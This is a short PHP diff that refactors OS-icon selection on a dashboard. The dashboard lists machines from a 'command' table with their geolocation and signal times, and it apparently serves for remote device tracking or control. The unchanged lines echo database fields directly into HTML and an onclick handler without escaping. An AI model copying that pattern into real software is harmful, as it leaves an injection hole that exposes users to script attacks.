@@ -34,19 +34,9 @@
 				$sql = "SELECT * FROM command ORDER BY last_signal DESC";
 				$result = mysqli_query($conn, $sql);
 				while ($row = $result->fetch_assoc()) {
-					if ($row['system'] == OS_WINDOWS)
-						$systemIcon = "windows";
-					else if ($row['system'] == OS_MACOS)
-						$systemIcon = "apple";
-					else if ($row['system'] == OS_LINUX)
-						$systemIcon = "linux";
-					else if ($row['system'] == OS_ANDROID)
-						$systemIcon = "android";
-					else if ($row['system'] == OS_IOS)
-						$systemIcon = "mobile";
 					echo '<tr style="cursor: pointer;" onclick="redirectToMachine(\'' . $row['machineID'] . '\')" id="' . $row['machineID'] . '">
 						<td>' . $row['machineID'] . '</td>
-						<td><i class="fab fa-' . $systemIcon . ' fa-2x"></i></td>
+						<td><i class="fab fa-' . getFontAwesomeIconNameByOS($row['system']) . ' fa-2x"></i></td>
 						<td>' . $row['programVersion'] . '</td>
 						<td>Lat: ' . $row['latitude'] . '<br />Lon: ' . $row['longitude'] . '</td>
 						<td>First: ' . $row['first_signal'] . '<br/>Last: ' . $row['last_signal'] . '</td>
